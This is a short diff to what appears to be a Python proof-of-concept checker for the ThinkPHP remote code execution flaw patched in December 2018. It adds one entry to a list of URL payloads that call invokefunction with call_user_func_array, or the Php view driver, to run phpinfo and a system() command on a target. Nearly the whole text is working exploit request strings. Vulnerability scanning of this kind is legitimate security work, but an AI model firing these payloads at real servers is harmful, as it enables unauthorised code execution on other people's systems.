@@ -9,7 +9,7 @@ description: ThinkPHP官方2018年12月9日发布重要的安全更新，修复�
 import HackRequests
 
 def poc(arg, **kwargs):
-    payloads = [r"/index.php?s=index/\think\view\driver\Php/display&content=<?php%20phpinfo();?>",r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'"]
+    payloads = [r"/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",r"/index.php?s=index/\think\view\driver\Php/display&content=<?php%20phpinfo();?>",r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'"]
     for payload in payloads:
         vulnurl = arg + payload
         try:
